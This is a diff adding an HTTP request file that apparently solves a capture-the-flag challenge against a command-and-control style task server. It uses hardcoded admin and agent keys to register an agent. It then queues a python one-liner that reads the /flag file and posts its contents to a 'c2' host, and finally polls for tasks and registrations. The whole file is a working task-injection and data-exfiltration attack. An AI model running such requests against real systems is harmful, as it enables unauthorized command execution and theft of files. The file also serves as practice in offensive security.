@@ -1,0 +1,35 @@
+@host = https://d48a3896-17db-4d0c-8e7f-2a1ce10e8094.openec.sc:1337
+@contentType = application/json
+@adminKey = f682917761bec2170d4b0af6bfc4be2b
+@agentKey = db46119b4e1c441ca156210d338ea6d9
+@agentId = 9abd4979a32409cc
+
+POST {{host}}/register HTTP/1.1
+agent-key: {{agentKey}}
+Content-Type: {{contentType}}
+
+{"agent_id": "{{agentId}}"}
+
+### 
+
+POST {{host}}/add_task HTTP/1.1
+admin-key: {{adminKey}}
+Content-Type: {{contentType}}
+
+{
+    "{{agentId}}": [[
+        "python3", "-c", "import requests; requests.post('http://c2:5000/register', json={'agent_id': open('/flag').read()}, headers={'agent-key': 'db46119b4e1c441ca156210d338ea6d9'})"
+    ]]
+}
+###     
+
+POST {{host}}/get_tasks HTTP/1.1
+agent-key: {{agentKey}}
+Content-Type: {{contentType}}
+
+{"agent_id": "{{agentId}}"}
+
+### 
+
+GET {{host}}/get_registered HTTP/1.1
+admin-key: {{adminKey}}
